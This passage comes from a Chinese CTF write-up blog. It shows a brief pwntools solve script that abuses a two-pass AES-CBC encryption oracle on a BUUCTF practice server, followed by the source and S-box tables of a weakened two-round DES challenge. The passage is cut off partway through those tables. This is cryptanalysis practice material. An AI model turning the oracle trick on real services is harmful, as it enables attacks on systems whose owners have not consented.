class="built_in">print</span>(<span class="string">&quot;Try again&quot;</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		exit()</span><br></pre></td></tr></table></figure>

<p>尚师傅给的思路，两轮AES_CBC，用已知IV去异或，具体的过程还是对着CBC的流程看去吧，小难想，但想透了就酱</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25321</span>)</span><br><span class="line">iv = sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># first time</span></span><br><span class="line">sh.send(iv)</span><br><span class="line">cipher = sh.recvline()</span><br><span class="line">sh.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># second time</span></span><br><span class="line">sh.send(cipher)</span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<h3 id="Crypto-Yusa的密码学课堂——SEDSED（recuring）"><a href="#Crypto-Yusa的密码学课堂——SEDSED（recuring）" class="headerlink" title="Crypto-Yusa的密码学课堂——SEDSED（recuring）"></a>Crypto-Yusa的密码学课堂——SEDSED（recuring）</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> My_box <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_64 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        key_64 += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(key[i], <span class="number">16</span>))</span><br><span class="line">    key_56 = gen_56bit(key_64)</span><br><span class="line">    left_key, right_key = key_56[:<span class="number">28</span>], key_56[<span class="number">28</span>:]</span><br><span class="line">    round_keys = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        L = circular_shift(left_key, round_shifts[index])</span><br><span class="line">        R = circular_shift(right_key, round_shifts[index])</span><br><span class="line">        round_key = gen_48bit(L + R)</span><br><span class="line">        round_keys.append(round_key)</span><br><span class="line">        left_key = L</span><br><span class="line">        right_key = R</span><br><span class="line">    <span class="keyword">return</span> round_keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift</span>(<span class="params">key, n</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    temp = key[n:] + key[:n]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_56bit</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_56 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> KEY_P1:</span><br><span class="line">        key_56 += key[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> key_56</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_48bit</span>(<span class="params">key</span>):</span></span><br><span class="line">    key_48 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> KEY_P2:</span><br><span class="line">        key_48 += key[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> key_48</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">plain_text, sub_keys</span>):</span></span><br><span class="line">    plain_textb = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        plain_textb += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(plain_text[i], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    plain_textp = permutation(plain_textb)</span><br><span class="line">    left, right = plain_textp[:<span class="number">32</span>], plain_textp[<span class="number">32</span>:]</span><br><span class="line">    out = func(right, sub_keys[<span class="number">0</span>])</span><br><span class="line">    temp = <span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(left, <span class="number">2</span>)</span><br><span class="line">    left, right = right, <span class="string">&#x27;&#123;0:032b&#125;&#x27;</span>.<span class="built_in">format</span>(temp)</span><br><span class="line">    out = func(right, sub_keys[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    temp = <span class="built_in">int</span>(out, <span class="number">2</span>) ^ <span class="built_in">int</span>(left, <span class="number">2</span>)</span><br><span class="line">    left = <span class="string">&#x27;&#123;0:032b&#125;&#x27;</span>.<span class="built_in">format</span>(temp)</span><br><span class="line">    final = inv_permutation(left + right)</span><br><span class="line">    cipher = <span class="built_in">hex</span>(<span class="built_in">int</span>(final, <span class="number">2</span>))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    p = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> IP:</span><br><span class="line">        p += plain_text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">text, key</span>):</span></span><br><span class="line">    exp = expand(text)</span><br><span class="line">    s_input = <span class="string">&#x27;&#123;0:048b&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>(exp, <span class="number">2</span>) ^ <span class="built_in">int</span>(key, <span class="number">2</span>))</span><br><span class="line">    s_out = sbox(s_input)</span><br><span class="line">    f_final = per_func(s_out)</span><br><span class="line">    <span class="keyword">return</span> f_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">expand</span>(<span class="params">text</span>):</span></span><br><span class="line">    temp = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> E:</span><br><span class="line">        temp += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inv_permutation</span>(<span class="params">text</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> Inv_IP:</span><br><span class="line">        final += text[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">per_func</span>(<span class="params">s_output</span>):</span></span><br><span class="line">    s_final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> P:</span><br><span class="line">        s_final += s_output[x - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> s_final</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sbox</span>(<span class="params">s_input, index=<span class="literal">None</span></span>):</span></span><br><span class="line">    s_out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> index != <span class="literal">None</span>:</span><br><span class="line">        i = index</span><br><span class="line">        row = <span class="built_in">int</span>(s_input[<span class="number">0</span>] + s_input[<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        column = <span class="built_in">int</span>(s_input[<span class="number">1</span>:<span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">        s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[i][row][column])</span><br><span class="line">        <span class="keyword">return</span> s_out</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            row = <span class="built_in">int</span>(s_input[<span class="number">6</span> * i] + s_input[<span class="number">6</span> * i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            column = <span class="built_in">int</span>(s_input[<span class="number">6</span> * i + <span class="number">1</span>:<span class="number">6</span> * i + <span class="number">5</span>], <span class="number">2</span>)</span><br><span class="line">            s_out += <span class="string">&#x27;&#123;0:04b&#125;&#x27;</span>.<span class="built_in">format</span>(S[i][row][column])</span><br><span class="line">        <span class="keyword">return</span> s_out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    sub_keys = gen_key(key_64)</span><br><span class="line">    cipher_text = encrypt(plain_text, sub_keys)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    size = (<span class="number">16</span> - (<span class="built_in">len</span>(plain_text) % <span class="number">16</span>)) % <span class="number">16</span></span><br><span class="line">    plain_text += size * <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">myenc</span>(<span class="params">plain_text</span>):</span></span><br><span class="line">    plain_text = pad(plain_text)</span><br><span class="line">    cipher_text = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plain_text), <span class="number">16</span>):</span><br><span class="line">        block = plain_text[i:i + <span class="number">16</span>]</span><br><span class="line">        block_enc = enc(block).rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        cipher_text += block_enc</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc2</span>(<span class="params">plain_text, key</span>):</span></span><br><span class="line">    sub_keys = gen_key(key)</span><br><span class="line">    cipher_text = encrypt(plain_text, sub_keys)</span><br><span class="line">    <span class="keyword">return</span> cipher_text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_64 = os.urandom(<span class="number">8</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">teststring = <span class="string">&quot;testtest&quot;</span></span><br><span class="line"><span class="built_in">print</span>(enc2(teststring.encode().<span class="built_in">hex</span>(), key_64))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span>, myenc(flag.encode().<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 77a35598c47aeea6</span></span><br><span class="line"><span class="comment"># flag:  86721c7c1ebe2d0af8aa8e073073931b4a5ae6dcf03c784e3c70b5f8ce71cf9eb87f9b836eea0118</span></span><br></pre></td></tr></table></figure>

<p>My_box</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 64-&gt;56</span></span><br><span class="line">KEY_P1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">          <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">round_shifts = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"><span class="comment"># 56-&gt;48</span></span><br><span class="line">KEY_P2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>,</span><br><span class="line">          <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">IP = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>,</span><br><span class="line">      <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>,</span><br><span class="line">      <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">E = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">S = [</span><br><span class="line">    <span class="comment"># Box-1</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>],</span><br><span class="line">        [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-2</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-3</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-4</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>],</span><br><span class="line">        [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ],</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Box-5</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>],</span><br><span class="line">        [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-6</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-7</span></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment"># Box-8</span></span><br><span class="line"></span><br><span class="line">    [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, 